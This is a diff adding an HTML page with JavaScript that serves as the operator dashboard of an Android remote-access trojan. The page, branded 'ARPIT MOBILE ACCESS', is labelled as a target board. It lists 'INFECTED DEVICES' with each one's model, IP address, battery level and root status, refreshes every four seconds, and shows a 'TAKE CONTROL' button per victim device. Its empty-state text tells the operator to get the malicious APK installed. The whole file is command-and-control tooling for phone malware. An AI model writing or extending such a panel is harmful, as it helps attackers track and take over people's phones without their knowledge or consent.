@@ -1,0 +1,51 @@
+<!doctype html>
+<html lang="en"><head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>PANEL — ARPIT MOBILE ACCESS</title>
+<link rel="stylesheet" href="/style.css">
+</head><body>
+<div class="wrap">
+  <header>
+    <div class="brand">ARPIT MOBILE ACCESS<small>TARGET BOARD</small></div>
+    <a href="/">← ROOT</a>
+  </header>
+  <h1 id="title">// LOADING</h1>
+  <p class="mono" id="sub"></p>
+  <h2>INFECTED DEVICES</h2>
+  <div class="grid" id="list"></div>
+  <footer>Developed by <b>arpitff</b></footer>
+</div>
+<script>
+const id = location.pathname.split('/')[2];
+const $ = (s) => document.querySelector(s);
+
+async function tick() {
+  const b = await fetch(`/api/builds/${id}`).catch(() => null);
+  const devs = await (await fetch(`/api/devices/${id}`)).json();
+  $('#title').textContent = '// ' + id;
+  $('#sub').textContent = `${devs.length} devices · ${devs.filter(d => d.online).length} live`;
+
+  const list = $('#list');
+  list.innerHTML = devs.length ? '' : '<div class="card mono">Koi device nahi. APK install karwao.</div>';
+
+  for (const d of devs) {
+    const el = document.createElement('div');
+    el.className = 'card';
+    el.innerHTML = `
+      <div class="row" style="justify-content:space-between">
+        <span><i class="dot ${d.online ? 'live' : ''}"></i> ${d.brand} ${d.model}</span>
+        <span class="tag ${d.online ? 'on' : 'off'}">${d.online ? 'ONLINE' : 'OFF'}</span>
+      </div>
+      <p class="mono" style="margin:8px 0">Android ${d.android} (SDK ${d.sdk})</p>
+      <p class="mono">${d.ip || '—'} · ${d.battery ?? '?'}% ${d.rooted ? '· ROOT' : ''}</p>
+      <div class="row" style="margin-top:12px">
+        <button data-go="${d.id}">TAKE CONTROL</button>
+      </div>`;
+    list.appendChild(el);
+  }
+  list.querySelectorAll('[data-go]').forEach(b => b.onclick = () => location.href = `/p/${id}/d/${b.dataset.go}`);
+}
+
+tick(); setInterval(tick, 4000);
+</script>
+</body></html>
